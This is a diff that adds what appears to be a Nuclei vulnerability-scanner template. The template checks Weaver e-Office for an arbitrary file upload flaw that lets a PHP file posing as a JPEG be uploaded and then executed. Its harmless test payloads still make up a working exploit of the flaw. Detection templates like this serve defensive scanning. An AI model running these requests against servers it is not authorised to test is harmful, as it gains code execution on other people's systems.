@@ -1,0 +1,96 @@
+id: weaver-e-office-file-upload-cnvd-2021-49104
+info:
+  name: Weaver e-Office File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Weaver e-Office is vulnerable to arbitrary file upload, allowing attackers to execute arbitrary code.
+  reference:
+    - https://chowdera.com/2021/12/202112190747169542.html
+
+variables:
+  randomBoundary: "{{rand_text_alpha(20)}}"
+  randomFilename: "{{md5(rand_text_alpha(8))}}"
+  randomInt: "{{rand_int(100000000, 200000000)}}"
+
+flow: |
+  http(1) && http(2) || http(3) && http(4)
+
+http:
+  - id: upload-logo
+    method: POST
+    path:
+      - "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
+    headers:
+      Content-Type: "multipart/form-data; boundary={{randomBoundary}}"
+    body: |
+      --{{randomBoundary}}
+      Content-Disposition: form-data; name="Filedata"; filename="{{randomFilename}}.php"
+      Content-Type: image/jpeg
+
+      <?php echo "{{randomFilename}}"; unlink(__FILE__); ?>
+      --{{randomBoundary}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "logo-eoffice.php"
+    stop-at-first-match: true
+
+  - id: verify-upload-logo
+    method: GET
+    path:
+      - "/images/logo/logo-eoffice.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{randomFilename}}"
+
+  - id: upload-theme
+    method: POST
+    path:
+      - "/general/index/UploadFile.php?m=uploadPicture&uploadType=theme&userId="
+    headers:
+      Content-Type: "multipart/form-data; boundary={{randomBoundary}}"
+    body: |
+      --{{randomBoundary}}
+      Content-Disposition: form-data; name="Filedata"; filename="test.php"
+      Content-Type: image/jpeg
+
+      <?php echo md5("{{randomInt}}"); ?>
+      --{{randomBoundary}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - "name\\s*:\\s*\\\"(.+?).php\\\""
+        internal: true
+
+  - id: verify-upload-theme
+    method: GET
+    path:
+      - "/images/themes/{{filename}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{md5(to_string(randomInt))}}"
